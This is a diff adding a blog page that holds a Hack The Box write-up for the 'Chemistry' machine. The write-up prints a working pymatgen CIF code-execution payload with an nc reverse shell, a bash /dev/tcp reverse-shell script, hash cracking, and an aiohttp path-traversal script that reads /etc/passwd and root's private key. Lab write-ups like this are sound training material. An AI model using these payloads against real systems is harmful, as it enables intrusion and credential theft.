@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HTB - Chemistry :: squ4r00t</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for the &#39;Easy&#39; rated machine: Chemistry" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/htb-chemistry/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:1313/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="//localhost:1313/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB - Chemistry">
+<meta property="og:description" content="Writeup for the &#39;Easy&#39; rated machine: Chemistry" />
+<meta property="og:url" content="//localhost:1313/posts/htb-chemistry/" />
+<meta property="og:site_name" content="squ4r00t" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/img/htb/chemistry/tn.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-03-03 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &lt; squ4r00t &gt;
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/whoami">$ whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+      
+        
+          <li><a href="/whoami" >$ whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/htb-chemistry/">HTB - Chemistry</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-03-03</time><span class="post-author">squ4r00t</span>
+    
+</div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/htb/">htb</a>&nbsp;
+      
+    </span>
+  
+  
+    
+    <img src="//localhost:1313/img/htb/chemistry/tn.png"
+      class="post-cover"
+      alt=" "
+      title="Cover Image" />
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the <code>pymatgen</code> (CVE-2024-23346) Python library by uploading a malicious <code>CIF</code> file to the hosted <code>CIF Analyzer</code> website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as <code>rosa</code> user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called <code>AioHTTP</code> (CVE-2024-23334) which is used on the web application running internally to read the root flag.</p>
+<h2 id="port-scanning">Port Scanning<a href="#port-scanning" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">5000/tcp open  upnp?   syn-ack
+</span></span></code></pre></div><p>We got 2 ports open:</p>
+<ul>
+<li>22 running ssh</li>
+<li>5000 running a web server</li>
+</ul>
+<h2 id="website">Website<a href="#website" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>Navigating to <code>http://10.10.11.38:5000</code>, we get the following page:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/home_page.png"   />
+    
+      <figcaption class="center" >Home Page</figcaption>
+    
+  </figure>
+
+
+<p>The content of the home page already gives us a hint:</p>
+<blockquote>
+<p>This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p></blockquote>
+<p>We also have the possibility to log in or to create an account.</p>
+<h3 id="login-page">Login Page<a href="#login-page" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>On the login page, I tried submitting some defaults credentials and quickly tested for basic sqli but without success:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/login_page_invalid_creds.png"   />
+    
+      <figcaption class="center" >Invalid credentials</figcaption>
+    
+  </figure>
+
+
+<h3 id="creating-an-account">Creating an account<a href="#creating-an-account" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>We can try to register an account at <code>/register</code></p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/create_account.png"   />
+    
+      <figcaption class="center" >Registering an account</figcaption>
+    
+  </figure>
+
+
+<p>After registering an account we get access to the following dashboard:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/dashboard.png"   />
+    
+      <figcaption class="center" >Dashboard</figcaption>
+    
+  </figure>
+
+
+<p>The website allows us to upload a CIF file. It also provides us with an example at <code>/static/example.cif</code>:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="279635148" type="checkbox"  />
+    <label for="279635148">
+      <span class="collapsable-code__language">cif</span>
+      <span class="collapsable-code__title">/static/example.cif</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-cif" ><code>
+data_Example
+_cell_length_a    10.00000
+_cell_length_b    10.00000
+_cell_length_c    10.00000
+_cell_angle_alpha 90.00000
+_cell_angle_beta  90.00000
+_cell_angle_gamma 90.00000
+_symmetry_space_group_name_H-M &#39;P 1&#39;
+loop_
+ _atom_site_label
+ _atom_site_fract_x
+ _atom_site_fract_y
+ _atom_site_fract_z
+ _atom_site_occupancy
+ H 0.00000 0.00000 0.00000 1
+ O 0.50000 0.50000 0.50000 1
+</code></pre>
+  </div>
+
+
+<h3 id="exploit-for-cif-files">Exploit for CIF files<a href="#exploit-for-cif-files" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>A searching for exploits involving CIF files, we find <a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">this security report</a> showing how we can get RCE with a malicious CIF file using this POC:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="237169845" type="checkbox"  />
+    <label for="237169845">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">POC cif file</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          &#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]&#43;[&#34;__sub&#34; &#43; &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;touch pwned&#34;);0,0,0&#39;
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  &#34;P  n&#39;  m  a&#39;  &#34;
+</code></pre>
+  </div>
+
+
+<p>Let&rsquo;s replace the command with a reverse shell:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="316824795" type="checkbox"  />
+    <label for="316824795">
+      <span class="collapsable-code__language">cif</span>
+      <span class="collapsable-code__title">Reverse shell cif file</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-cif" ><code>
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          &#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]&#43;[&#34;__sub&#34; &#43; &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.4 1337 &gt;/tmp/f&#34;);0,0,0&#39;
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  &#34;P  n&#39;  m  a&#39;  &#34;
+</code></pre>
+  </div>
+
+
+<p>Now let&rsquo;s upload it:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/upload_cif.png"   />
+    
+      <figcaption class="center" >Uploading malicious CIF file</figcaption>
+    
+  </figure>
+
+
+<p>After clicking on upload, we see that we can view it or delete it:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/after_upload.png"   />
+    
+      <figcaption class="center" >File uploaded</figcaption>
+    
+  </figure>
+
+
+<p>If we click on view, we get a 500 Internal server error, and we don&rsquo;t get a reverse shell.</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/500_err.png"   />
+    
+      <figcaption class="center" >500 Internal server error</figcaption>
+    
+  </figure>
+
+
+<p>However if we replace the command with just <code>nc &lt;IP&gt; &lt;PORT&gt;</code>, we get a connection.</p>
+<p>In this case, we can upload the reverse shell, and then execute it</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/hosting_revshell.png"   />
+    
+      <figcaption class="center" >Hosting reverse shell with python http server</figcaption>
+    
+  </figure>
+
+
+<p>The file <code>shell.sh</code> contains the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.4/1337 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><p>After, uploading and clicking on view, we see the file was downloaded:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/web_server_hit.png"   />
+    
+      <figcaption class="center" >Hit on python http server</figcaption>
+    
+  </figure>
+
+
+<p>We can now change the command, so that our reverse shell is executed</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/exec_shell.png"   />
+    
+      <figcaption class="center" >Changing the command in cif file</figcaption>
+    
+  </figure>
+
+
+<p>After re-uploading the file, and then clicking on View, we finally get a shell back:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/got_shell.png"   />
+    
+      <figcaption class="center" >Reverse shell</figcaption>
+    
+  </figure>
+
+
+<h2 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>In our current directory, we find the source code of the website in <code>app.py</code> which also contains credentials:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/db_pass.png"   />
+    
+      <figcaption class="center" >Credentials in app.py</figcaption>
+    
+  </figure>
+
+
+<p>After looking around some more, we find a the sqlite database inside the <code>instance</code> directory.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="537926814" type="checkbox"  />
+    <label for="537926814">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">SQLite database found</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+app@chemistry:~/instance$ file database.db
+database.db: SQLite 3.x database, last written using SQLite version 3031001
+</code></pre>
+  </div>
+
+
+<p>Looking at the contents of this file with <code>strings</code>, we are able to get the hashes of the users:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/hashes.png"   />
+    
+      <figcaption class="center" >Users' hashes</figcaption>
+    
+  </figure>
+
+
+<p>Let&rsquo;s try to crack the hash of the user <code>rosa</code>, since they are on the machine:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="132568497" type="checkbox"  />
+    <label for="132568497">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Cracking rosa&rsquo;s hash</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+hashcat -m 0 &#39;&lt;HASH&gt;&#39; /usr/share/wordlists/rockyou.txt
+</code></pre>
+  </div>
+
+
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/rosa_cracked.png"   />
+    
+  </figure>
+
+
+<p>We can ssh as <code>rosa</code> and retrieve the user flag</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/user.png"   />
+    
+      <figcaption class="center" >Usdr flag obtained !</figcaption>
+    
+  </figure>
+
+
+<h3 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>After some enumeration, we find out that something is running on <code>127.0.0.1:8080</code></p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/netstat.png"   />
+    
+      <figcaption class="center" >Netstat output</figcaption>
+    
+  </figure>
+
+
+<p>We can forward that port to our machine with:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="492786315" type="checkbox"  />
+    <label for="492786315">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Port forwarding :8080</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
+</code></pre>
+  </div>
+
+
+<p>Now after going to <code>http://127.0.0.1:8080</code>, we get access to this website allowing us to list services:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/monitoring_site.png"   />
+    
+      <figcaption class="center" >Monitoring website</figcaption>
+    
+  </figure>
+
+
+<p>Looking at the response headers, we see something unusual for the <code>Server</code> header (<code>Python/3.9 aiohttp/3.9.1</code>):</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/res_headers.png"   />
+    
+      <figcaption class="center" >Response Headers</figcaption>
+    
+  </figure>
+
+
+<p>After some reasearch, we see that it might be vulnerable to CVE-2024-23334 which is a path traversal vulnerability.</p>
+<p>Using this <a href="https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh">poc</a> (with some little changes):</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="247398156" type="checkbox"  />
+    <label for="247398156">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">CVE-2024-23334 Exploit POC (modified)</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+#!/bin/bash
+
+url=&#34;http://127.0.0.1:8080&#34;
+string=&#34;../&#34;
+payload=&#34;/&#34;
+file=&#34;etc/passwd&#34;
+
+for ((i=0; i&lt;15; i&#43;&#43;)); do
+    payload&#43;=&#34;$string&#34;
+    echo &#34;[&#43;] Testing with $payload$file&#34;
+    status_code=$(curl --path-as-is -s -o /dev/null -w &#34;%{http_code}&#34; &#34;$url$payload$file&#34;)
+    echo -e &#34;\tStatus code --&gt; $status_code&#34;
+
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is &#34;$url$payload$file&#34;
+        break
+    fi
+done
+</code></pre>
+  </div>
+
+
+<p>We were able to retrieve the <code>/etc/passwd</code> file:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/etc_passwd.png"   />
+    
+      <figcaption class="center" >Reading /etc/passwd</figcaption>
+    
+  </figure>
+
+
+<p>We can repeat the same process in order to read the private key of the root user:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/id_rsa.png"   />
+    
+      <figcaption class="center" >Reading root's private key</figcaption>
+    
+  </figure>
+
+
+<p>We can use it to login as root and retrieve the flag:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/chemistry/root.png"   />
+    
+      <figcaption class="center" >Root flag obtained !</figcaption>
+    
+  </figure>
+
+
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="//localhost:1313/posts/blogpost-portscanning-through-pivots/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Port scanning through network pivots</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/htb-forest/">
+                <span class="button__text">HTB - Forest</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
